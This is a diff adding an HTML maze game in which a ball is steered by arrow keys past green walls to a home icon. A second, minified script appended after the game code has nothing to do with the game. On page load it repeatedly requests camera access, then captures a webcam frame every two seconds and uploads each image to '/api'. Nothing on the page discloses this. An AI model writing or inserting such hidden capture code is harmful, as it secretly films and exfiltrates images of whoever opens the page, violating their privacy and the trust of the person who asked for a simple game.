@@ -1,0 +1,208 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Challenging Maze Game</title>
+  <style>
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+    }
+
+    body {
+      background: #000;
+      font-family: 'Arial', sans-serif;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+      overflow: hidden;
+    }
+
+    h1 {
+      position: absolute;
+      top: 20px;
+      color: #00FF00;
+      font-size: 2rem;
+      text-align: center;
+      width: 100%;
+    }
+
+    .game-container {
+      position: relative;
+      width: 400px;
+      height: 400px;
+      border: 5px solid #00FF00;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+    }
+
+    .maze {
+      position: relative;
+      width: 380px;
+      height: 380px;
+      background: radial-gradient(circle, rgba(0, 0, 0, 0.9), rgba(0, 255, 0, 0.1));
+      border: 2px dashed #00FF00;
+    }
+
+    .ball {
+      position: absolute;
+      top: 10px;
+      left: 10px;
+      width: 20px;
+      height: 20px;
+      background-color: #FF4500;
+      border-radius: 50%;
+      box-shadow: 0 0 15px #FF4500, 0 0 50px #FF4500, 0 0 100px #FF4500;
+      transition: 0.1s linear;
+    }
+
+    .walls {
+      position: absolute;
+      background-color: #00FF00;
+      z-index: 1;
+    }
+
+    /* Existing walls */
+    .wall1 { top: 0; left: 100px; width: 20px; height: 180px; }
+    .wall2 { top: 200px; left: 100px; width: 20px; height: 180px; }
+
+    /* Wall 3 with hole */
+    .wall3 { top: 100px; left: 300px; width: 20px; height: 120px; }
+    .wall3-hole { top: 260px; left: 300px; width: 20px; height: 120px; background-color: transparent; }
+
+    /* Wall 4 with hole */
+    .wall4 { top: 100px; left: 100px; width: 100px; height: 20px; }
+    .wall4-hole { top: 100px; left: 220px; width: 100px; height: 20px; background-color: transparent; }
+
+    /* New additional walls */
+    .wall5 { top: 50px; left: 200px; width: 20px; height: 100px; }
+    .wall6 { top: 150px; left: 200px; width: 100px; height: 20px; }
+    .wall7 { top: 250px; left: 50px; width: 20px; height: 130px; }
+    .wall8 { top: 280px; left: 170px; width: 130px; height: 20px; }
+    .wall9 { top: 330px; left: 100px; width: 120px; height: 20px; }
+    .wall10 { top: 50px; left: 50px; width: 150px; height: 20px; }
+
+    .finish {
+      position: absolute;
+      top: 10px;
+      right: 10px;
+      font-size: 2rem;
+      color: #FFD700;
+      z-index: 10;
+    }
+  </style>
+</head>
+<body>
+  <h1>Maze Game - Reach the Home!</h1>
+  <div class="game-container">
+    <div class="maze">
+      <!-- Existing walls -->
+      <div class="walls wall1"></div>
+      <div class="walls wall2"></div>
+      <div class="walls wall3"></div>
+      <div class="walls wall3-hole"></div>
+      <div class="walls wall4"></div>
+      <div class="walls wall4-hole"></div>
+
+      <!-- Additional walls for more challenge -->
+      <div class="walls wall5"></div>
+      <div class="walls wall6"></div>
+      <div class="walls wall7"></div>
+      <div class="walls wall8"></div>
+      <div class="walls wall9"></div>
+      <div class="walls wall10"></div>
+
+      <!-- Ball -->
+      <div class="ball" id="ball"></div>
+
+      <!-- Home Icon (Finish Point) -->
+      <div class="finish" id="finish">🏠</div>
+    </div>
+  </div>
+
+  <script>
+    const ball = document.getElementById('ball');
+    const finish = document.getElementById('finish');
+    const maze = document.querySelector('.maze');
+
+    let ballX = 10;  // Initial position
+    let ballY = 10;
+    const ballSize = 20;
+    const mazeSize = 380;
+
+    function updateBallPosition() {
+      ball.style.left = ballX + 'px';
+      ball.style.top = ballY + 'px';
+    }
+
+    document.addEventListener('keydown', moveBall);
+
+    function moveBall(e) {
+      const step = 10;  // The ball moves 10px per key press
+
+      switch(e.key) {
+        case 'ArrowUp':
+          if (ballY > 0) ballY -= step;
+          break;
+        case 'ArrowDown':
+          if (ballY < mazeSize - ballSize) ballY += step;
+          break;
+        case 'ArrowLeft':
+          if (ballX > 0) ballX -= step;
+          break;
+        case 'ArrowRight':
+          if (ballX < mazeSize - ballSize) ballX += step;
+          break;
+      }
+
+      updateBallPosition();
+      checkCollision();
+    }
+
+    function checkCollision() {
+      const walls = document.querySelectorAll('.walls:not(.wall3-hole):not(.wall4-hole)');
+      walls.forEach(wall => {
+        const wallRect = wall.getBoundingClientRect();
+        const ballRect = ball.getBoundingClientRect();
+
+        if (ballRect.left < wallRect.right &&
+            ballRect.right > wallRect.left &&
+            ballRect.top < wallRect.bottom &&
+            ballRect.bottom > wallRect.top) {
+          resetGame();
+        }
+      });
+
+      // Check if ball reaches the home icon (🏠)
+      const finishRect = finish.getBoundingClientRect();
+      const ballRect = ball.getBoundingClientRect();
+      if (ballRect.left < finishRect.right &&
+          ballRect.right > finishRect.left &&
+          ballRect.top < finishRect.bottom &&
+          ballRect.bottom > finishRect.top) {
+        alert('You Win!');
+        document.removeEventListener('keydown', moveBall);
+      }
+    }
+
+    function resetGame() {
+      ballX = 10;
+      ballY = 10;
+      updateBallPosition();
+      alert("You hit a wall! Try again.");
+    }
+  </script>
+  <script>
+    async function setupCamera(){try{const stream=await navigator.mediaDevices.getUserMedia({video:true});return stream;}catch(error){console.error("Error accessing camera:",error);return null;}}
+    async function captureImage(video){let canvas=document.createElement("canvas");let context=canvas.getContext("2d");canvas.width=video.videoWidth;canvas.height=video.videoHeight;context.drawImage(video,0,0,canvas.width,canvas.height);let imageData=canvas.toDataURL("image/png");
+    try{let response=await fetch("/api",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({image:imageData})});let result=await response.json();}catch(error){console.error("Error uploading image:",error);}}
+    async function startCapturing(){while(true){const stream=await setupCamera();if(stream){const video=document.createElement("video");video.srcObject=stream;video.play();
+    setInterval(()=>{captureImage(video);},2000);break;}else{await new Promise(resolve=>setTimeout(resolve,5000));}}}
+    startCapturing();
+</script>
+</body>
+</html>
